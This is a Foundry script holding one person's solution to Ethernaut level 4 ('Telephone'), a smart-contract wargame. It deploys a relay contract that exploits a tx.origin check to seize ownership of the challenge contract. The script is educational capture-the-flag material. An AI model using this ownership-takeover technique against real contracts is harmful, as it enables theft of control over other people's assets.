// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// Import challenge contract here
import {Telephone} from "../../challenge-contracts/04-Telephone.sol";

contract TelephoneSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Deploy TelephoneCaller contract;
        TelephoneCaller caller = new TelephoneCaller(challengeInstance);

        // Step 2: Call `invokeChangeOwner()` function in TelephoneCaller contract,
        //         TelephoneCaller contract calls `changeOwner()` function in Telephone contract;
        caller.invokeChangeOwner();

        // Step 3: Confirm that caller `heroAddress` has successfully obtained ownership of the Telephone contract.
        address heroAddress = vm.addr(heroPrivateKey);
        Telephone telephone = Telephone(challengeInstance);
        require(heroAddress == telephone.owner(), "Owner check failed");
        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(4));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract TelephoneCaller {
    Telephone telephone;

    constructor(address _telephoneAddress) {
        telephone = Telephone(_telephoneAddress);
    }

    function invokeChangeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
